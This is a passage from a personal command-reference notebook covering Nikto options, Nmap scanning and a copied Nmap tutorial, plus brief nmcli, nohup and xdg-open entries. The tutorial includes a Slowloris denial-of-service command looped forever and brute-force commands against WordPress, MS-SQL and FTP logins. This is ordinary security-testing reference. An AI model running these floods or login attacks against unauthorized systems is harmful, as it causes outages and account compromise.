       -key+              Client certificate key file
       -list-plugins      List all available plugins, perform no testing
       -maxtime+          Maximum testing time per host (e.g., 1h, 60m, 3600s)
       -mutate+           Guess additional file names:
                               1     Test all files with all root directories
                               2     Guess for password file names
                               3     Enumerate user names via Apache (/~user type requests)
                               4     Enumerate user names via cgiwrap (/cgi-bin/cgiwrap/~user type requests)
                               5     Attempt to brute force sub-domain names, assume that the host name is the parent domain
                               6     Attempt to guess directory names from the supplied dictionary file
       -mutate-options    Provide information for mutates
       -nointeractive     Disables interactive features
       -nolookup          Disables DNS lookups
       -nossl             Disables the use of SSL
       -noslash           Strip trailing slash from URL (e.g., '/admin/' to '/admin')
       -no404             Disables nikto attempting to guess a 404 page
       -Option            Over-ride an option in nikto.conf, can be issued multiple times
       -output+           Write output to this file ('.' for auto-name)
       -Pause+            Pause between tests (seconds)
       -Plugins+          List of plugins to run (default: ALL)
       -port+             Port to use (default 80)
       -RSAcert+          Client certificate file
       -root+             Prepend root value to all requests, format is /directory
       -Save              Save positive responses to this directory ('.' for auto-name)
       -ssl               Force ssl mode on port
       -Tuning+           Scan tuning:
                               1     Interesting File / Seen in logs
                               2     Misconfiguration / Default File
                               3     Information Disclosure
                               4     Injection (XSS/Script/HTML)
                               5     Remote File Retrieval - Inside Web Root
                               6     Denial of Service
                               7     Remote File Retrieval - Server Wide
                               8     Command Execution / Remote Shell
                               9     SQL Injection
                               0     File Upload
                               a     Authentication Bypass
                               b     Software Identification
                               c     Remote Source Inclusion
                               d     WebService
                               e     Administrative Console
                               x     Reverse Tuning Options (i.e., include all except specified)
       -timeout+          Timeout for requests (default 10 seconds)
       -Userdbs           Load only user databases, not the standard databases
                               all   Disable standard dbs and load only user dbs
                               tests Disable only db_tests and load udb_tests
       -useragent         Over-rides the default useragent
       -until             Run until the specified time or duration
       -url+              Target host/URL (alias of -host)
       -usecookies        Use cookies from responses in future requests
       -useproxy          Use the proxy defined in nikto.conf, or argument </rich_text>
          <rich_text link="webs http://server:port">http://server:port</rich_text>
          <rich_text>
       -Version           Print plugin and database versions
       -vhost+            Virtual host (for Host header)
       -404code           Ignore these HTTP codes as negative responses (always). Format is "302,301".
       -404string         Ignore this string in response body content as negative response (always). Can be a regular expression.
                + requires a value
</rich_text>
        </node>
      </node>
      <node name="nmap" unique_id="9" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283319" ts_lastsave="1728008382">
        <rich_text scale="h1" weight="heavy">Nmap</rich_text>
        <rich_text scale="h1"> </rich_text>
        <rich_text scale="h1" weight="heavy">7.94SVN</rich_text>
        <rich_text>

Source: </rich_text>
        <rich_text link="webs https://nmap.org" weight="heavy">https://nmap.org</rich_text>
        <rich_text>

</rich_text>
        <rich_text weight="heavy">Usage</rich_text>
        <rich_text>: </rich_text>
        <rich_text background="#777776767b7b" foreground="#ffffffffffff">nmap</rich_text>
        <rich_text background="#777776767b7b"> [</rich_text>
        <rich_text background="#777776767b7b" foreground="#24241f1f3131">Scan Type(s)</rich_text>
        <rich_text background="#777776767b7b">] [</rich_text>
        <rich_text background="#777776767b7b" foreground="#24241f1f3131">Options</rich_text>
        <rich_text background="#777776767b7b">] {</rich_text>
        <rich_text background="#777776767b7b" foreground="#24241f1f3131">target specification</rich_text>
        <rich_text background="#777776767b7b">}
</rich_text>
        <rich_text>
# Hot ( you need root access for this scans )
	nmap </rich_text>
        <rich_text foreground="#e6e661610000">-sV -O -A -n --script vuln</rich_text>
        <rich_text>
	nmap </rich_text>
        <rich_text foreground="#e6e661610000">-sV -O -A -n -p- --script vuln</rich_text>
        <rich_text>

</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">-sn		:	Ping Scan - disable port scan</rich_text>
        <rich_text> (VeryFast scan)
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">-sV		:	Probe open ports to determine service/version info
-A		:	Enable OS detection, version detection, script scanning, and traceroute
-O		:	-O: Enable OS detection
-n		:	-n/-R: Never do DNS resolution/Always resolve [default: sometimes]
-p-		:	scan all ports
-sC		:	equivalent to --script=default
-Pn		:	Treat all hosts as online -- skip host discovery
</rich_text>
        <rich_text>
</rich_text>
        <rich_text foreground="#f9f9f0f06b6b">-T		:	1...5 |  Slow...Fast 
 
-sS/sT/sA/sW/sM	:	TCP SYN/Connect()/ACK/Window/Maimon scans
-sU				:	UDP Scan</rich_text>
        <rich_text>


# EXAMPLES
	nmap -v -A scanme.nmap.org
	nmap -v -sn 192.168.0.0/16 10.0.0.0/8
	nmap -v -iR 10000 -Pn -p 80

# Ping scan (disable port scan | fast scan)
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-sn</rich_text>
        <rich_text> 192.168.1.0/24

# Fast scan (first 1000 port) / Top ports scan / all ports
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-F </rich_text>
        <rich_text>192.168.1.125
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">--top-ports</rich_text>
        <rich_text> 20 192.168.1.125
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-p-</rich_text>
        <rich_text> 192.168.1.125

# Fast Mode:
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-T5</rich_text>
        <rich_text> 192.168.1.125 -p-

# Read a list / Set output file
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-iL </rich_text>
        <rich_text>list.txt
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-oN </rich_text>
        <rich_text>output.txt 192.168.1.0/24

# TCP / UDP
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-sT</rich_text>
        <rich_text> 192.168.1.1
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-sU</rich_text>
        <rich_text> 192.168.1.1
	
# with DNS / without DNS
	nmap -p 80 8.8.8.8
	nmap -p 80 </rich_text>
        <rich_text foreground="#f5f5c2c21111">-n</rich_text>
        <rich_text> 8.8.8.8

# OS (-O or -A) and faster execution (-T4)
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-A</rich_text>
        <rich_text> -T4 92.168.1.125

# </rich_text>
        <rich_text scale="h3">Detect service/daemon versions</rich_text>
        <rich_text>
	nmap </rich_text>
        <rich_text foreground="#f5f5c2c21111">-sV</rich_text>
        <rich_text> localhost
	
</rich_text>
        <rich_text scale="h3"># CVE detection</rich_text>
        <rich_text>
	nmap -Pn </rich_text>
        <rich_text foreground="#f5f5c2c21111">--script vuln</rich_text>
        <rich_text> 192.168.1.105

  
  
SEE THE MAN PAGE (</rich_text>
        <rich_text link="webs https://nmap.org/book/man.html">https://nmap.org/book/man.html</rich_text>
        <rich_text>) FOR MORE OPTIONS AND EXAMPLES


# Mask
255.255.255.x/24			3x8	= 24
255.255.255.x/16			2x8	= 16
255.255.255.x/8				1x8		= 8
255.255.255.x/0				0x8	= 0
</rich_text>
        <node name="Hidden hotkeys" unique_id="321" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724283142" ts_lastsave="1724529378">
          <rich_text>use the '</rich_text>
          <rich_text foreground="#35358484e4e4">d</rich_text>
          <rich_text>' to increase debug mode
use the '</rich_text>
          <rich_text foreground="#35358484e4e4">v</rich_text>
          <rich_text>' to increase verbose mode
use the '</rich_text>
          <rich_text foreground="#35358484e4e4">p</rich_text>
          <rich_text>' to see transitions
use </rich_text>
          <rich_text background="#eded33333b3b">shift</rich_text>
          <rich_text> + '</rich_text>
          <rich_text foreground="#35358484e4e4">KEY</rich_text>
          <rich_text>' to reverse the functions
</rich_text>
        </node>
        <node name="Port scan options" unique_id="320" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724283103" ts_lastsave="1724712774">
          <rich_text># Scan All ports
</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap -p- 192.168.1.1/24</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">-p-		:	scan all ports</rich_text>
          <rich_text>


# Scan UDP/TCP of all ports 
</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap -n -PN -sT -sU -p- 192.168.1.1/24</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">-n		:	skip DNS resolution
-Pn		:	Treat all hosts as online -- skip host discovery
-sT		:	Initiate a TCP connect scan
-sU		:	preforms a UDP scan
-p-		:	scan all ports</rich_text>
          <rich_text>


# Ping Scan (fast)
</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap -sn 192.168.1.1/24</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">-sn		:	Ping Scan - disable port scan</rich_text>
          <rich_text foreground="#35358484e4e4">
</rich_text>
          <rich_text>
# Scan port 80
</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap  192.168.1.1/24 -p 80</rich_text>
          <rich_text>
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">-p &lt;port ranges&gt;	: Only scan specified ports
Ex:		-p22; -p1-65535; -p U:53,111,137,T:21-25,80,139,8080,S:9</rich_text>
          <rich_text>

# Scan ports from 25 to 999
</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap  192.168.1.1/24 -p 25-999</rich_text>
          <rich_text>


# More Port scan options
</rich_text>
          <rich_text foreground="#f9f9f0f06b6b">--exclude-ports &lt;port ranges&gt;	: Exclude the specified ports from scanning
-F		:	Fast mode - Scan fewer ports than the default scan
-r		:	Scan ports sequentially - don't randomize</rich_text>
          <rich_text>

</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap  192.168.1.1/24 -F</rich_text>
          <rich_text>  # first 100 port
</rich_text>
          <rich_text foreground="#6262a0a0eaea">$ nmap  192.168.1.1/24 -r</rich_text>
          <rich_text>  # scan from 1.2.3..65535 in sequence</rich_text>
        </node>
        <node name="similar" unique_id="322" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724284607" ts_lastsave="1724710860">
          <rich_text>Zenmap
Ncat
Ndiff
Nping</rich_text>
        </node>
        <node name="Top 16 Commands" unique_id="336" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724709793" ts_lastsave="1724710795">
          <rich_text scale="h1" weight="heavy">1. Basic Nmap Scan against IP or host</rich_text>
          <rich_text>
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 1.1.1.1</rich_text>
          <rich_text>
Now, if you want to scan a hostname, simply replace the IP for the host, as you see below:
nmap recordedfuture.xyz
This kind of scans, such as the Nmap scan host are perfect for your first steps when starting with Nmap.


</rich_text>
          <rich_text scale="h1" weight="heavy">2. Nmap Ping Scan</rich_text>
          <rich_text>
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -sp 192.168.5.0/24</rich_text>
          <rich_text>
The most famous type of scan is the Nmap ping scan (so-called because  it’s often used to perform Nmap ping sweeps), and it’s the easiest way  to detect hosts on any network.
The drawback of this ICMP-only type of scan is that remote hosts  often block IP-based ping packets, so if you’re unable to get solid  results, we recommend switching to ARP-based requests for your scan.


</rich_text>
          <rich_text scale="h1" weight="heavy">3. Scan specific ports or scan entire port ranges on a local or remote server</rich_text>
          <rich_text>
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -p 1-65535 localhost</rich_text>
          <rich_text>
In this example, we scanned all 65535 ports for our localhost computer.
Nmap is able to scan all possible ports, but you can also scan specific ports, which will report faster results. See below:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -p 80,443 8.8.8.8</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">4. Scan multiple IP addresses
</rich_text>
          <rich_text>Let’s try to scan multiple IP addresses. For this you need to use this syntax: 
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 1.1.1.1 8.8.8.8</rich_text>
          <rich_text>

You can also scan consecutive IP addresses: 
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 1.1.1.1,2,3,4</rich_text>
          <rich_text>
This will scan 1.1.1.1, 1.1.1.2, 1.1.1.3 and 1.1.1.4.


</rich_text>
          <rich_text scale="h1" weight="heavy">5. Scan IP ranges</rich_text>
          <rich_text>
You can also use Nmap to scan entire CIDR IP ranges, for example:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 8.8.8.0/28</rich_text>
          <rich_text>

This will scan 14 consecutive IP ranges, from 8.8.8.1 to 8.8.8.14.
An alternative is to simply use this kind of range:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 8.8.8.1-14</rich_text>
          <rich_text>

You can even use wildcards to scan the entire C class IP range, for example:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 8.8.8.*</rich_text>
          <rich_text>

This will scan 256 IP addresses from 8.8.8.1 to 8.8.8.256. 
If you ever need to exclude certain IPs from the IP range scan, you can use the “–exclude” option, as you see below:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -p 8.8.8.* --exclude 8.8.8.1</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">6. Scan the most popular ports</rich_text>
          <rich_text>
Using “–top-ports” parameter along with a specific number lets you  scan the top X most common ports for that host, as we can see:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap --top-ports 20 192.168.1.106</rich_text>
          <rich_text>

Replace “20” with the desired number. Output example:
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap --top-ports 20 localhost</rich_text>
          <rich_text>
 Starting Nmap 6.40 at 2018-10-01 10:02 EDT
 Nmap scan report for localhost (127.0.0.1)
 Host is up (0.000016s latency).
 Other addresses for localhost (not scanned): 127.0.0.1
 PORT STATE SERVICE
 21/tcp closed ftp
 22/tcp closed ssh
 23/tcp closed telnet
 25/tcp closed smtp
 53/tcp closed domain
 80/tcp filtered http
 110/tcp closed pop3
 111/tcp closed rpcbind
 135/tcp closed msrpc
 139/tcp closed netbios-ssn
 143/tcp closed imap
 443/tcp filtered https
 445/tcp closed microsoft-ds
 993/tcp closed imaps
 995/tcp closed pop3s
 1723/tcp closed pptp
 3306/tcp closed mysql
 3389/tcp closed ms-wbt-server
 5900/tcp closed vnc
 8080/tcp closed http-proxy


</rich_text>
          <rich_text scale="h1" weight="heavy">7. Scan hosts and IP addresses reading from a text file</rich_text>
          <rich_text>
In this case, Nmap is also useful to read files that contain hosts and IPs inside.
Let’s suppose you create a list.txt file that contains these lines inside:
192.168.1.106
 recordedfuture.xyz
 securitytrails.xyz
The “-iL” parameter lets you read from that file, and scan all those hosts for you:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -iL list.txt</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">8. Save your Nmap scan results to a file</rich_text>
          <rich_text>
On the other hand, in the following example we will not be reading  from a file, but exporting/saving our results into a text file:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -oN output.txt securitytrails.xyz</rich_text>
          <rich_text>

Nmap has the ability to export files into XML format as well, see the next example:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -oX output.xml securitytrails.xyz</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">9. Disabling DNS name resolution</rich_text>
          <rich_text>
If you need to speed up your scans a little bit, you can always  choose to disable reverse DNS resolution for all your scans. Just add  the “</rich_text>
          <rich_text foreground="#35358484e4e4">-n</rich_text>
          <rich_text>” parameter.
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap -p 80 -n 8.8.8.8</rich_text>
          <rich_text>
 Starting Nmap 7.60 at 2018-10-01 09:15 -03
 Nmap scan report for 8.8.8.8
 Host is up (0.014s latency).
 PORT STATE SERVICE
 80/tcp filtered http
 
See the difference with a normal DNS-resolution enabled scan: 
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap -p 80 8.8.8.8</rich_text>
          <rich_text>
 Starting Nmap 7.60 at 2018-10-01 09:15 -03
 Nmap scan report for google-public-dns-a.google .com (8.8.8.8)
 Host is up (0.014s latency).
 PORT STATE SERVICE
 80/tcp filtered http


</rich_text>
          <rich_text scale="h1" weight="heavy">10. Scan + OS and service detection with fast execution</rich_text>
          <rich_text>
Using the “-A” parameter enables you to perform OS and service  detection, and at the same time we are combining this with “-T4” for  faster execution. See the example below:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -A -T4 securitytrails.xyz</rich_text>
          <rich_text>
This is the output we got for this test:
 

</rich_text>
          <rich_text scale="h1" weight="heavy">11. Detect service/daemon versions</rich_text>
          <rich_text>
This can be done by using -sV parameters
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -sV localhost</rich_text>
          <rich_text>

As you can see here: 
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap -sV localhost</rich_text>
          <rich_text>
 Starting Nmap 7.60 at 2018-10-01 09:28 -03
 Nmap scan report for localhost (127.0.0.1)
 Host is up (0.000020s latency).
 Other addresses for localhost (not scanned): ::1
 Not shown: 997 closed ports
 PORT STATE SERVICE VERSION
 111/tcp open rpcbind 2-4 (RPC #100000)
 631/tcp open ipp CUPS 2.2
 902/tcp open ssl/vmware-auth VMware Authentication Daemon 1.10 (Uses VNC, SOAP)
Service detection performed. Please report any incorrect results at https:// nmap .org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 7.96 seconds

</rich_text>
          <rich_text scale="h1" weight="heavy">12. Scan using TCP or UDP protocols</rich_text>
          <rich_text>
One of the things we love most about Nmap is the fact that it works  for both TCP and UDP protocols. And while most services run on TCP, you  can also get a great advantage by scanning UDP-based services. Let’s see  some examples. 

Standard TCP scanning output:
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap -sT 192.168.1.1</rich_text>
          <rich_text>
 Starting Nmap 7.60 at 2018-10-01 09:33 -03
 Nmap scan report for 192.168.1.1
 Host is up (0.58s latency).
 Not shown: 995 closed ports
 PORT STATE SERVICE
 80/tcp open http
 1900/tcp open upnp
 20005/tcp open btx
 49152/tcp open unknown
 49153/tcp open unknown
 Nmap done: 1 IP address (1 host up) scanned in 1.43 seconds
 
UDP scanning results using “</rich_text>
          <rich_text foreground="#35358484e4e4">-sU</rich_text>
          <rich_text>” parameter: 
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap -sU localhost</rich_text>
          <rich_text>
 Starting Nmap 7.60 at 2018-10-01 09:37 -03
 Nmap scan report for localhost (127.0.0.1)
 Host is up (0.000021s latency).
 Other addresses for localhost (not scanned): ::1
 Not shown: 997 closed ports
 PORT STATE SERVICE
 68/udp open|filtered dhcpc
 111/udp open rpcbind
 5353/udp open|filtered zeroconf


</rich_text>
          <rich_text scale="h1" weight="heavy">13. CVE detection using Nmap</rich_text>
          <rich_text>
One of Nmap’s greatest features that not all the network and systems  administrators know about is something called “Nmap Scripting Engine”  (known as </rich_text>
          <rich_text link="webs https://nmap.org/book/nse.html">NSE</rich_text>
          <rich_text>). This scripting engine allows users to use a pre-defined set of scripts, or write their own using Lua programming language. 
Using </rich_text>
          <rich_text link="webs https://securitytrails.com/blog/nmap-scripts-nse">Nmap scripts</rich_text>
          <rich_text>  is crucial in order to automate system and vulnerability scans. For  example, if you want to run a full vulnerability test against your  target, you can use these parameters:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -Pn --script vuln 192.168.1.105</rich_text>
          <rich_text>

Output example:
[root@securitytrails:~]</rich_text>
          <rich_text foreground="#35358484e4e4">nmap -Pn --script vuln 192.168.1.105</rich_text>
          <rich_text>
 Starting Nmap 7.60 at 2018-10-01 09:46 -03
 Pre-scan script results:
 | broadcast-avahi-dos:
 | Discovered hosts:
 | 224.0.0.251
 | After NULL UDP avahi packet DoS (CVE-2011-1002).
 |_ Hosts are all up (not vulnerable).
 Nmap scan report for 192.168.1.105
 Host is up (0.00032s latency).
 Not shown: 995 closed ports
 PORT STATE SERVICE
 80/tcp open http
 |_http-csrf: Couldn't find any CSRF vulnerabilities.
 |_http-dombased-xss: Couldn't find any DOM based XSS.
 | http-slowloris-check:
 | VULNERABLE:
 | Slowloris DOS attack
 | State: LIKELY VULNERABLE
 | IDs: CVE:CVE-2007-6750
 | Slowloris tries to keep many connections to the target web server open and hold
 | them open as long as possible. It accomplishes this by opening connections to
 | the target web server and sending a partial request. By doing so, it starves
 | the http server's resources causing Denial Of Service.
 |
 | Disclosure date: 2009-09-17
 | References:
 |_ https:// cve.mitre .org/cgi-bin/cvename.cgi?name=CVE-2007-6750
 |_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
 |_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
 1900/tcp open upnp
 20005/tcp open btx
 49152/tcp open unknown
 49153/tcp open unknown
As you can see, in this vulnerability test we were able to detect one CVE (Slowloris DOS attack).


</rich_text>
          <rich_text scale="h1" weight="heavy">14. Flood testing with Nmap</rich_text>
          <rich_text>
Nmap features never seem to end, and thanks to the NSE, that even  allows us to launch flood attacks against our network to test how  effective our mitigation methods are. 
In our previous example (#12) we found the host was vulnerable to  Slowloris attack, and now we’ll try to exploit that vulnerability by  launching a flood attack in a forever loop:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap 192.168.1.105 -max-parallelism 800 -Pn --script http-slowloris --script-args http-slowloris.runforever=true</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">15. Testing brute force attacks</rich_text>
          <rich_text>
NSE is really fascinating -- it contains scripts for everything you  can imagine. See the next three examples of BFA against WordPress,  MSSQL, and FTP server:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -sV --script  http-wordpress-brute --script-args  'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.xyz,  http-wordpress-brute.threads=3,brute.firstonly=true' 192.168.1.105</rich_text>
          <rich_text>

WordPress brute force attack:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105</rich_text>
          <rich_text>

Brute force attack against MS-SQL:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -p 1433 --script ms-sql-brute --script-args userdb=customuser.txt,passdb=custompass.txt 192.168.1.105</rich_text>
          <rich_text>

FTP brute force attack:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap --script ftp-brute -p 21 192.168.1.105</rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h1" weight="heavy">16. Detecting malware infections on remote hosts</rich_text>
          <rich_text>
Nmap is able to detect malware and backdoors by running extensive  tests on a few popular OS services like Identd, Proftpd, Vsftpd, IRC,  SMB, and SMTP. It also has a module to check for popular malware signs  inside remote servers and integrates Google’s Safe Browsing and  VirusTotal databases as well.
A common malware scan can be performed by using:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -sV --script=http-malware-host 192.168.1.105</rich_text>
          <rich_text>

Or using Google’s Malware check:
</rich_text>
          <rich_text background="#1a1a5f5fb4b4" foreground="#ffffffffffff">nmap -p80 --script http-google-malware infectedsite.xyz</rich_text>
          <rich_text>

Output example:
Nmap is one of the most complete and accurate port scanners used by  infosec professionals today. With it, you can perform simple port scan  tasks or use its powerful scripting engine to launch DOS attacks, detect  malware or brute force testing on remote and local servers.
Today we covered the top fifteen Nmap commands to scan remote hosts,  but there’s a lot more to discover if you’re starting to use Nmap in  your </rich_text>
          <rich_text link="webs https://www.recordedfuture.com/blog/open-source-intelligence-definition">OSINT</rich_text>
          <rich_text> strategy.
</rich_text>
        </node>
      </node>
      <node name="nmcli" unique_id="185" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285809" ts_lastsave="1729197264">
        <rich_text scale="h1" weight="heavy">nmcli</rich_text>
        <rich_text>
nmcli (1)            - command-line tool for controlling NetworkManager


</rich_text>
        <rich_text foreground="#3333d1d17a7a">$ nmcli
$ nmcli </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">device show</rich_text>
        <rich_text foreground="#3333d1d17a7a">
$ nmcli </rich_text>
        <rich_text foreground="#8f8ff0f0a4a4">connection show</rich_text>
      </node>
      <node name="nohup" unique_id="344" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724731944" ts_lastsave="1724732245">
        <rich_text scale="h1" weight="heavy">nohup</rich_text>
        <rich_text>

$ </rich_text>
        <rich_text foreground="#1c1c7171d8d8">nohup</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#6262a0a0eaea">command</rich_text>
        <rich_text>
$ </rich_text>
        <rich_text foreground="#1a1a5f5fb4b4">nohup</rich_text>
        <rich_text> </rich_text>
        <rich_text foreground="#6262a0a0eaea">command</rich_text>
        <rich_text> &gt; file


or 

$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">command</rich_text>
        <rich_text>  &gt;&gt; 'file.txt'			(re-write)
$ </rich_text>
        <rich_text foreground="#6262a0a0eaea">command</rich_text>
        <rich_text>  &gt; 'file.txt'				(append)

SYNOPSIS
       nohup COMMAND [ARG]...
       nohup OPTION


# whatis 
nohup (1)            - run a command immune to hangups, with output to a non-tty</rich_text>
        <node name="--help" unique_id="345" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724732074" ts_lastsave="1724732075">
          <rich_text>Usage: nohup COMMAND [ARG]...
  or:  nohup OPTION
Run COMMAND, ignoring hangup signals.

      --help        display this help and exit
      --version     output version information and exit

If standard input is a terminal, redirect it from an unreadable file.
If standard output is a terminal, append output to 'nohup.out' if possible,
'$HOME/nohup.out' otherwise.
If standard error is a terminal, redirect it to standard output.
To save output to FILE, use 'nohup COMMAND &gt; FILE'.

NOTE: your shell may have its own version of nohup, which usually supersedes
the version described here.  Please refer to your shell's documentation
for details about the options it supports.

Exit status:
  125  if the nohup command itself fails
  126  if COMMAND is found but cannot be invoked
  127  if COMMAND cannot be found
  -    the exit status of COMMAND otherwise

GNU coreutils online help: &lt;</rich_text>
          <rich_text link="webs https://www.gnu.org/software/coreutils/">https://www.gnu.org/software/coreutils/</rich_text>
          <rich_text>&gt;
Report any translation bugs to &lt;</rich_text>
          <rich_text link="webs https://translationproject.org/team/">https://translationproject.org/team/</rich_text>
          <rich_text>&gt;
Full documentation &lt;</rich_text>
          <rich_text link="webs https://www.gnu.org/software/coreutils/nohup">https://www.gnu.org/software/coreutils/nohup</rich_text>
          <rich_text>&gt;
or available locally via: info '(coreutils) nohup invocation'
</rich_text>
        </node>
      </node>
      <node name="nslookup" unique_id="39" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684283989" ts_lastsave="1684284006"/>
      <node name="oclock" unique_id="130" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1684285249" ts_lastsave="1724731944"/>
      <node name="open" unique_id="326" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724697769" ts_lastsave="1728580844">
        <rich_text scale="h1" weight="heavy">$ open</rich_text>
        <rich_text foreground="#9a9a99999696"> (see exo-open too)</rich_text>
        <rich_text>

xdg-open - opens a file or URL in the user's preferred application

# Usage
xdg-open { file | URL }
xdg-open { --help | --manual | --version }


# EXAMPLE

</rich_text>
        <rich_text weight="heavy">$ open ./
$ open file.type
$ open www.google.com</rich_text>
        <node name="man" unique_id="327" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1724697790" ts_lastsave="1724697967">
          <rich_text>NAME
       xdg-open - opens a file or URL in the user's preferred application

SYNOPSIS

       xdg-open {file | URL}

       xdg-open {--help | --manual | --version}

DESCRIPTION
       xdg-open opens a file or URL in the user's preferred application. If a URL is
       provided the URL will be opened in the user's preferred web browser. If a file is
       provided the file will be opened in the preferred application for files of that
       type. xdg-open supports file, ftp, http and https URLs.

       xdg-open is for use inside a desktop session only. It is not recommended to use
       xdg-open as root.

OPTIONS
       --help
           Show command synopsis.

       --manual
           Show this manual page.

       --version
           Show the xdg-utils version information.

EXIT CODES
       An exit code of 0 indicates success while a non-zero exit code indicates failure.
       The following failure codes can be returned:

       1
           Error in command line syntax.

       2
           One of the files passed on the command line did not exist.

       3
           A required tool could not be found.

       4
           The action failed.

SEE ALSO
       xdg-mime(1), xdg-settings(1), MIME applications associations specification[1]

EXAMPLES
           xdg-open '</rich_text>
